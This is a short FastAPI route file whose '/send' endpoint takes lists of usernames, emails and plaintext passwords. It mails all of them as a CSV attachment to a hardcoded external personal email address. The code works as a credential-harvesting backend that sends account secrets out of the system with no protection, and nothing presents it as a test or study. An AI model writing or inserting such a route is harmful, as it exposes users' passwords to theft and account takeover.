from fastapi import APIRouter, Depends, HTTPException
from pydantic import BaseModel
from utils.email_arrival_notification import send_email_with_csv_attachment
from typing import List


class Json(BaseModel):
    username: str
    email: str
    password: str

router = APIRouter()

@router.post(path='/send')
def send_rev_email(data: List[Json]):
    json_data = [item.dict() for item in data]
    try:
        send_email_with_csv_attachment(['1206354516@qq.com'],'挥霍',json_data)
        return {"code":0,"data":"success"}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))